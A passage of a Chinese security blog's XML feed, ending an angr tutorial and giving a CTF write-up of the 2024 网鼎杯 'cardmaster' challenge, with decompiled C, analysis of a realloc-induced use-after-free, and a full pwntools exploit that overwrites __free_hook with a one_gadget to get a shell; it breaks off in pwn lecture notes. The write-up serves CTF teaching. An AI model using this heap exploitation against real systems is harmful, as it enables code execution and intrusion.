punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    stored_solutions <span class="token operator">=</span> solution_state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span>    scanf0_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    scanf1_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf0_solution<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf1_solution<span class="token punctuation">)</span><span class="token comment">#1448564819</span><span class="token comment">#1398294103</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;angr基础知识&quot;&gt;&lt;a href=&quot;#angr基础知识&quot; class=&quot;headerlink&quot; title=&quot;angr基础知识&quot;&gt;&lt;/a&gt;angr基础知识&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="angr" scheme="https://starrysky1004.github.io/categories/angr/"/>
    
    
    <category term="angr" scheme="https://starrysky1004.github.io/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>2024网鼎杯cardmaster</title>
    <link href="https://starrysky1004.github.io/2024/12/04/2024-wang-ding-bei-cardmaster/2024-wang-ding-bei-cardmaster/"/>
    <id>https://starrysky1004.github.io/2024/12/04/2024-wang-ding-bei-cardmaster/2024-wang-ding-bei-cardmaster/</id>
    <published>2024-12-03T16:21:58.000Z</published>
    <updated>2024-12-03T16:41:47.959Z</updated>
    
    <content type="html"><![CDATA[<p>视频版：<a href="https://www.bilibili.com/video/BV1p8BoYPEae">https://www.bilibili.com/video/BV1p8BoYPEae</a></p><p>程序使用<code>rand</code>函数模拟洗牌，同时可以通过程序设置、获取卡牌信息，也可以重新初始化或进行随机，考察点是<code>2.27</code>使用<code>realloc</code>造成的<code>uaf</code>，同时在管理结构中存在<code>get</code>功能的函数指针，攻击思路就是利用<code>uaf</code>修改函数指针为<code>ogg</code>从而<code>getshell</code></p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="init-card"><a href="#init-card" class="headerlink" title="init_card"></a>init_card</h3><p>初始化卡牌，创建了<code>card_manager</code>和<code>heap_manager</code>并进行相关初始化</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_QWORD <span class="token operator">*</span><span class="token function">init_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>current_heap<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-1Ch]</span>  manager <span class="token operator">*</span>card_manager<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h]</span>  card_manager <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>heap_manager <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>index <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    current_heap <span class="token operator">=</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>current_heap <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xD0uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">12</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10LL</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> index<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 1-13</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  card_manager<span class="token operator">-></span>card_len <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>heap_size <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>card <span class="token operator">=</span> card<span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>func <span class="token operator">=</span> output_func<span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>random_level <span class="token operator">=</span> <span class="token number">0x3E8LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>card_len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>card_manager</code>的结构体如下，存在<code>card</code>、<code>func</code>、<code>heap_manager</code>三个指针和<code>card_len</code>、<code>heap_size</code>、<code>random_level</code>三个参数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">00000000</span> <span class="token keyword">struct</span> <span class="token class-name">manager</span> <span class="token comment">// sizeof=0x28</span><span class="token number">00000000</span> <span class="token punctuation">&#123;</span><span class="token number">00000000</span>     <span class="token keyword">unsigned</span> __int32 card_len<span class="token punctuation">;</span><span class="token number">00000004</span>     <span class="token keyword">unsigned</span> __int32 heap_size<span class="token punctuation">;</span><span class="token number">00000008</span>     <span class="token keyword">unsigned</span> __int64 random_level<span class="token punctuation">;</span><span class="token number">00000010</span>     <span class="token keyword">unsigned</span> __int64 card<span class="token punctuation">;</span><span class="token number">00000018</span>     <span class="token keyword">unsigned</span> __int64 func<span class="token punctuation">;</span><span class="token number">00000020</span>     <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>heap_manager<span class="token punctuation">;</span><span class="token number">00000028</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>card</code>指针指向的地址中存在卡牌的所有花色，花色的种类数量是<code>card_len</code>，初始值为<code>4</code>，初始花色是<code>data</code>段的<code>♥♠♦♣</code></li><li><code>heap_manager</code>指向堆管理地址，保存了卡牌的位置和花色，初始堆的数量是<code>13</code>，每个堆的大小等于<code>heap_size * 0x10</code></li><li><code>random_level</code>设置了随机化等级，在后续随机化函数会用到，初始值为<code>0x3e8</code></li><li><code>func</code>指向一个输出函数，初始值是程序段的<code>output_func</code></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">output_func</span><span class="token punctuation">(</span>manager <span class="token operator">*</span>manager<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit count is %d\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"digit range: 1 - %d\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>heap_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit chara set:%s\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>card<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"randomize level:%lld\n"</span><span class="token punctuation">,</span> manager<span class="token operator">-></span>random_level<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p><code>set</code>函数由用户自定义了卡牌信息</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> __fastcall <span class="token function">set</span><span class="token punctuation">(</span>manager <span class="token operator">*</span>card_manager<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>current_heap<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">signed</span> __int32 i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>card_address<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit count:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> card_manager<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"digit range 1 - ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"randomize level:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>random_level<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> card_manager<span class="token operator">-></span>card <span class="token operator">==</span> card <span class="token punctuation">)</span>    card_address <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    card_address <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>card<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  card_manager<span class="token operator">-></span>heap_manager <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>index <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">>=</span> result <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>result <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    current_heap <span class="token operator">=</span> <span class="token operator">&amp;</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>current_heap <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> card_manager<span class="token operator">-></span>heap_size<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16LL</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> index<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>card_manager<span class="token operator">-></span>heap_manager<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> card_address <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    card_manager<span class="token operator">-></span>card <span class="token operator">=</span> card_address<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"new suite set:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> card_manager<span class="token operator">-></span>card<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> card_manager<span class="token operator">-></span>card_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>由用户输入了<code>card_len</code>、<code>heap_size</code>、<code>random_level</code></li><li>创建<code>card</code>堆块<ul><li>当前<code>card_manager</code>中的<code>card</code>值与<code>data</code>段的<code>card</code>值相同的时候使用<code>malloc</code>创建长度为<code>4 * card_len</code>的<code>card</code>堆块</li><li>不同的时候使用<code>realloc</code>调整堆块的大小为<code>4 * card_len</code></li></ul></li><li>使用<code>realloc</code>调整堆管理结构大小为<code>8 * card_len</code></li><li>循环创建数量为<code>card_len</code>的堆块，堆块大小为输入的<code>heap_size</code>，并且在堆块中存放位置和花色</li><li>设置<code>card_manager</code>中的<code>card</code>的地址为创建的<code>card</code>堆块地址</li></ul><p>其中<code>realloc</code>在<code>card_len</code>为<code>0</code>的时候存在<code>uaf</code>漏洞</p><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>该功能调用的<code>card_manager</code>中的<code>func</code>函数对堆中的内容进行输出，包括<code>card_len</code>、<code>heap_size</code>、<code>card</code>内容、<code>random_level</code>，其中<code>card</code>可修改为堆指针，存在内存泄露</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                                   <span class="token comment">// get</span>        <span class="token punctuation">(</span>card_manager<span class="token operator">-></span>func<span class="token punctuation">)</span><span class="token punctuation">(</span>card_manager<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h2><p>在<code>set</code>的时候控制堆大小进而控制<code>card</code>为一个大堆块，再将<code>size</code>设置为<code>0</code>释放后进入<code>unsorted bin</code>，通过<code>get</code>函数泄露出<code>libc</code>地址，再进行<code>tcache bin attack</code>，当<code>calloc</code>的<code>size</code>和堆大小相同时相当于<code>edit</code>，利用这一点改<code>tcache bin</code>中的地址为<code>free_hook</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'173.41.49.110'</span><span class="token punctuation">,</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_content</span><span class="token punctuation">(</span>card_size<span class="token punctuation">,</span> heap_size<span class="token punctuation">,</span> level<span class="token punctuation">,</span> card<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'count'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>card_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'range'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>heap_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'level'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>level<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> card<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'set'</span><span class="token punctuation">,</span> card<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebc61</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27-3/libc-2.27.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseset_content<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>set_content<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;视频版：&lt;a href=&quot;https://www.bilibili.com/video/BV1p8BoYPEae&quot;&gt;https://www.bilibili.com/video/BV1p8BoYPEae&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;程序使用&lt;code&gt;rand&lt;/code&gt;函数模</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>《重生之我在yctu做pwn手》系列视频笔记</title>
    <link href="https://starrysky1004.github.io/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/"/>
    <id>https://starrysky1004.github.io/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/</id>
    <published>2024-11-06T07:41:19.214Z</published>
    <updated>2024-12-04T08:45:34.573Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-pwn环境配置"><a href="#1-pwn环境配置" class="headerlink" title="1.pwn环境配置"></a>1.pwn环境配置</h2><p>视频讲解：<a href="https://www.bilibili.com/video/BV1YT1oYeEVd">https://www.bilibili.com/video/BV1YT1oYeEVd</a></p><p>配置指令：<a href="https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/">https://starrysky1004.github.io/2024/10/05/pwn-huan-jing-pei-zhi/</a></p><h2 id="2-基础知识-amp-ret2text"><a href="#2-基础知识-amp-ret2text" class="headerlink" title="2.基础知识 &amp; ret2text"></a>2.基础知识 &amp; ret2text</h2><h3 id="PWN解题目标"><a href="#PWN解题目标" class="headerlink" title="PWN解题目标"></a>PWN解题目标</h3><p>获取远程靶机里的<code>flag</code>文件中的字符串（<code>flag</code>是<strong>动态</strong>的，每个队伍的<code>flag</code>不同）</p><ul><li><p>获取<code>shell</code>：和远程终端交互通过<code>cat flag</code>获取</p><p>可以获取<code>shell</code>的函数：**<code>system(&#39;/bin/sh&#39;)</code>**<code>system(&#39;sh&#39;)</code><code>system(&#39;$0&#39;)</code></p><p>ps:读的是远程的<code>flag</code>文件，本地可以用<code>ls</code>确认是否获得<code>shell</code>或创建一个<code>flag</code>文件</p></li><li><p>读取<code>flag</code>（<code>open read write</code>）&#x2F; <code>system(&#39;cat flag&#39;)</code></p></li></ul><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">char</span> hello<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello 